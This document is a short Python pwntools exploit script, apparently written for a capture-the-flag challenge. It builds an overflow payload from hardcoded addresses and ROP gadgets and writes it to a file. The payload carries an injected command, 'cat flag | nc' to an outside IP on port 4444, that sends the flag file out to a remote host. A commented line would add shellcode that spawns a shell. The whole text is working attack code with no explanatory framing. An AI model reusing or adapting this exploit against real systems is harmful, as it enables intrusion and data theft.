from pwn import *
f = open("dmp",'w')

buf = ""
fill = "".join([chr(i) for i in range(0,0xf0)])

buf = "".join([chr(i) for i in range(24)])

buf += p32(0x1f41)
buf += p32(0x20)

buf += p64(0x604180) # just someplace writeable
buf += p64(0x402701) # 114 0x0000000000402701 : pop rsi ; pop r15 ; ret
buf += p64(0x04029C9)
buf += "Q"*8

buf += p64(0x4023A9)
#buf += "Q"*8

buf += fill[:0x190-0xc0]

buf += ";cat flag | nc 184.72.176.240 4444\x00"

buf += fill*((0x3fa9-len(buf))/len(fill))

counts = [buf.count(chr(i)) for i in range(0x100)]
print max(counts), counts
f.write(buf[:0x3e80])

f.write("\xcc"*20)
#f.write("\x90"*8+asm(shellcraft.amd64.sh(), arch="amd64", os="linux")+"\x90"*8+"\xcc")

f.close()
